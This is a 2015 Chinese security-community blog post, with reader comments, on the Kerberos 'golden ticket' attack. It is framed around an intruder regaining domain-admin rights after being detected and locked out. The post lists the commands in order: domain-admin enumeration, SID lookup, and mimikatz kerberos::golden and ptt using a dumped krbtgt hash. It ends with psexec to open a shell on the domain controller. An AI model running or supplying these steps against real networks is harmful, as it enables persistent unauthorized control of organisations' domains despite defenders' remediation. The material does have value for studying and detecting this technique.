<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">域渗透的金之钥匙</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mickey</a> <span class="bull">·</span> <time title="2015/10/13 11:33" ui-time="" datetime="2015/10/13 11:33" class="published ng-binding ng-isolate-scope">2015/10/13 11:33</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 废话连篇</h1><hr><p>最近几年很少搞内网渗透了，这几年发展的快啊，看了A牛翻译的<code>&lt;&lt;Fireeye Mandiant 2014 安全报告 Part1&gt;&gt;</code> ，发现趋势都是powershell脚本化了。想当年遇到的域控都是windows 2003的，找朋友要些vbscript脚本自动化，然后那啥那啥的。现在搞域除了前段时间出的MS14068，还有龙哥翻译的（<a href="http://drops.wooyun.org/papers/576">http://drops.wooyun.org/papers/576</a>）,不知道还有什么新方法，心中还有激情，如果想交流的朋友，可以加我聊聊。</p><h1>0x01 金之钥匙</h1><hr><p>我原来发过一个微薄说</p><p><img alt="" img-src="305cbf0c27e3d50a65b60e963415df52a4376df4.jpg"></p><p>这就是我说的金之钥匙，利用这个的条件是你在原来搞定域控的时候，已经导出过域用户的HASH，尤其是krbtgt 这个用户的。但是在你在内网干其他事情的时候，活儿不细，被人家发现了，你拥有的域管理员权限掉了，你现在还有一个普通的域用户权限，管理员做加固的时候又忘记修改krbtgt密码了（很常见），我们还是能重新回来，步骤如下：</p><p>要重新拿回域管理员权限，首先要先知道域内的管理员有谁</p><p><code>C:\Users\hydra&gt;net group "domain admins" /domain</code></p><p>我这里的实验环境，通过截图可以看到域管理员是administrator</p><p>我还要知道域SID是啥</p><p><code>C:\Users\hydra&gt;whoami /user</code></p><p>我的域SID是 <code>S-1-5-21-3883552807-251258116-2724407435</code></p><p>还有最重要的krbtgt用户的ntlm哈希，我原来导出的是</p><p>krbtgt(current-disabled):502:aad3b435b51404eeaad3b435b51404ee:<strong>6a8e501fabcf264c70 ef3316c6aab7dc:::</strong></p><p><img alt="" img-src="302f47d393a0bdf8c19de9a4f0adbd38a07af810.jpg"></p><p>然后该用神器mimikatz出场了，依次执行</p><pre><code>mimikatz # kerberos::purge
mimikatz # kerberos::golden /admin:Administrator /domain:pentstlab.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribi
mimikatz # kerberos::ptt Administrator.kiribi
mimikatz # kerberos::tgt
</code></pre><p><img alt="" img-src="c717ecc8dcecd053f06130ce19122117f9763b0f.jpg"></p><p>到现在，我们又重新拥有域管理员权限了，可以验证下</p><pre><code>E:\&gt;net use \\WIN-0DKN2AS0T2G\c$
E:\&gt;psexec.exe \\WIN-0DKN2AS0T2G cmd
</code></pre><p><img alt="" img-src="9bc064b3e5196a595f975f8f57a7f1c2c88dbda9.jpg"></p><h1>0x02 后话闲扯</h1><hr><p>呃，感觉这个方法比<a href="http://drops.wooyun.org/tips/9297">http://drops.wooyun.org/tips/9297</a>这个方便些，文章写了好久了，一直凑不出更多的字数，就没发。。嗯。。。懒了。。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Helen</span> <span class="reply-time">2015-10-27 20:27:53</span></div><p></p><p>@Her0in 装什么逼了？这个有标准翻译么？ 翻译成金票你能咋的？本身意思就差不多。比如Mandiant 翻译成曼迪安特和曼迪亚特错了么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">存在敏感词</span> <span class="reply-time">2015-10-19 10:44:57</span></div><p></p><p>我是看着mickey的文章长大的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SPRITEKING</span> <span class="reply-time">2015-10-16 21:52:44</span></div><p></p><p>来看Mickey牛秒域控了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小菜鸟</span> <span class="reply-time">2015-10-16 14:51:35</span></div><p></p><p>楼主有联系方式吗，我想详细请教您用法，我虚拟机私搭的环境用楼主方法行不通啊，命令行试了很多遍是没有错的！！！！！求楼主不吝赐教啊！！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">123</span> <span class="reply-time">2015-10-16 10:23:57</span></div><p></p><p>@Her0in 猫又叫咪咪，我就叫这个金钥匙，叫了好几年了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Her0in</span> <span class="reply-time">2015-10-15 20:58:18</span></div><p></p><p>@Mr.x PM！：）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">if、so</span> <span class="reply-time">2015-10-14 20:45:41</span></div><p></p><p>其实现实中，不是如何拿到权限，而是如何生存</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-10-14 10:09:10</span></div><p></p><p>drops 三好学生说了mimi各种用法姿势比较全</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mr.x</span> <span class="reply-time">2015-10-14 09:23:23</span></div><p></p><p>@Her0in 使用 golden ticket 连接域控 你也相当于给其他攻击者留下了后门,能否给科普科普下？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Vigoss_Z</span> <span class="reply-time">2015-10-13 19:51:19</span></div><p></p><p>我是你的脑残粉。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2015-10-13 18:07:03</span></div><p></p><p>@Her0in<br>.....<br>我哪儿表现出是我发现的了...-_-!!!<br>叫金之钥匙是因为当时看到有老外说了还有另一个方法搞域管权限的方法，想的叫银之钥，不过实践后，不太通用，当时懒，就没写完。&quot;golden ticket(s)&quot;叫黄金票据，确实比较好，多谢指点。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">兔兔咬死你</span> <span class="reply-time">2015-10-13 16:40:55</span></div><p></p><p>来溜达看看....咳...看不懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小菜鸟</span> <span class="reply-time">2015-10-13 16:18:03</span></div><p></p><p>完全按照楼主说的，行不通啊。。。。。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2015-10-13 15:44:24</span></div><p></p><p>@test golden里面</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2015-10-13 15:44:01</span></div><p></p><p>一直没有出现Lifetime是什么原因</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪猪侠</span> <span class="reply-time">2015-10-13 14:48:45</span></div><p></p><p>今年blackhat 上，微软ATA那个哥哥关于域渗透的议题讲得很深</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小菜鸟</span> <span class="reply-time">2015-10-13 11:41:55</span></div><p></p><p>大神啊，我菜鸟不知道mimikatz具体维持域控制权命令，找了俩三天具体用法。你就在今天发出来了，哈哈！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">珈蓝夜宇</span> <span class="reply-time">2015-10-13 11:36:57</span></div><p></p><p>我的第一眼&quot;</p><p>我原来发过一个微薄说</p><p>&quot;<br>微薄说</p><p></p></div></div></div></div></div></main>